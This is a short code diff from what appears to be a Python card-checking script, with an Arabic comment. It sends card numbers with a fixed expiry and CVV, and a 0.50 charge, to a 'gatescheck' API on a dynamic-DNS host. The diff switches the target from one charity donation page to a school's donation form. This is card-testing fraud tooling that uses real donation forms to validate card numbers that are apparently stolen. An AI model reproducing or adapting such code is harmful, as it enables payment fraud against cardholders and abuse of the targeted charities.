@@ -13,7 +13,7 @@ API_URL = "http://gatescheck.duckdns.org:7000/check"
 # دالة للتحقق من حالة البطاقة عبر API
 def check_card_api(card_number):
     params = {
-        "url": "https://raybensch.com/donations/support-ray/",
+        "url": "https://dandelionsmontessori.org/give/15767517?giveDonationFormInIframe=1",
         "card": f"{card_number}|09|28|092",
         "amount": 0.50
     }
